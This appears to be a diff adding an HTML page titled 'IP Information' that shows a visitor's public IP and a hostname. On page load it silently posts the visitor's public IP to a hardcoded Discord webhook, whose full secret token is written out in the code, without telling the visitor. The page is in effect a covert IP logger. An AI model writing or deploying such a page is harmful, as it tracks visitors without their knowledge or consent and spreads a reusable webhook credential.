@@ -1,1 +1,90 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IP Information</title>
+</head>
+<body>
+<h1>IP Information</h1>
+<div>
+<p><strong>Host PC Name:</strong> <span id="hostname"></span></p>
+<p><strong>Public IP:</strong> <span id="publicIP"></span></p>
+<p><strong>Private IP:</strong> <span id="privateIP"></span></p>
+</div>
+<script>
+    // Function to get public IP using an external API
+    async function getPublicIP() {
+        try {
+            let response = await fetch('https://api.ipify.org?format=json');
+            let data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error("Error getting public IP: ", error);
+            return "Error resolving public IP";
+        }
+    }
+ 
+    // Function to get private IP
+    function getPrivateIP() {
+        // Since JavaScript running in the browser can't directly access the private IP,
+        // we'll rely on the user or server to determine this info. Usually, the browser
+        // cannot access local network details directly.
+        return "Private IP is not accessible in the browser";
+    }
+ 
+    // Function to get the hostname
+    function getHostName() {
+        return window.location.hostname;  // Use current website's hostname as an example
+    }
+ 
+    // Function to send message via Discord webhook
+    async function sendWebhook() {
+        const publicIP = await getPublicIP();
+        const privateIP = getPrivateIP();
+        const hostName = getHostName();
+ 
+        const payload = {
+            content: `Host PC Name: ${hostName}\nPublic IP: ${publicIP}\nPrivate IP: ${privateIP}`
+        };
+ 
+        const webhookUrl = "https://discord.com/api/webhooks/1342083708970209300/Jiq_zdgb_7Fae0VDVx_pezCTh5TvQk4XCUdwaFOQH8f6s9CQSM4EWGFSlrVMNzoVq7XH";
+ 
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+ 
+            if (response.ok) {
+                console.log('Message sent successfully');
+            } else {
+                console.error('Error sending message', response.status, response.statusText);
+            }
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+ 
+    // Initialize the page with the current IP information
+    async function init() {
+        const publicIP = await getPublicIP();
+        const privateIP = getPrivateIP();
+        const hostName = getHostName();
+ 
+        document.getElementById('publicIP').innerText = publicIP;
+        document.getElementById('privateIP').innerText = privateIP;
+        document.getElementById('hostname').innerText = hostName;
+ 
+        // Automatically send the information to the webhook after fetching
+        await sendWebhook();
+    }
+ 
+    // Run initialization when the page is loaded
+    window.onload = init;
+</script>
+</body>
+</html>
